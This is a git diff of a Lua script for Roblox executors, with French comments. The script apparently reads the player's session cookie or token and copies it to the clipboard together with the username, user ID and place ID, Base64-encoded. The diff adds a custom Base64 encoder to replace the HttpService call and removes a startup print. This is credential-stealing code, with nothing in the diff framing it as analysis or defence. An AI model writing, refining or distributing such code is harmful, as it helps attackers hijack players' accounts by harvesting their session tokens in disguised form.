@@ -1,7 +1,3 @@
-print("Service lancé")
-
--- Compatible Android / PC selon exécuteur (setclipboard requis)
-local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
@@ -21,13 +17,25 @@ local function getCookie()
     return cookie or "Cookie non trouvé"
 end
 
--- Fonction pour copier un texte en Base64
+-- Fonction pour encoder une chaîne en Base64
+local function base64Encode(data)
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    return ((data:gsub('.', function(x)
+        local r,binary='',x:byte()
+        for i=8,1,-1 do r=r..(binary%2^i-binary%2^(i-1)>0 and '1' or '0') end
+        return r
+    end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
+        if #x < 6 then return '' end
+        local c=0
+        for i=1,6 do c=c + (x:sub(i,i)=='1' and 2^(6-i) or 0) end
+        return b:sub(c+1,c+1)
+    end)..({ '', '==', '=' })[#data%3+1])
+end
+
+-- Fonction pour copier un texte simple en Base64
 local function copyToClipboardBase64(token, userId, userName)
-    -- Texte simple à copier
     local text = "Nom: "..userName.."\nID: "..userId.."\nToken: "..token.."\nPlace: "..game.PlaceId.."\nTemps: "..os.time().."\nPlateforme: Android / Clipboard"
-    
-    -- Encodage Base64
-    local base64Data = HttpService:EncodeBase64(text)
+    local base64Data = base64Encode(text)
     
     if setclipboard then
         setclipboard(base64Data)
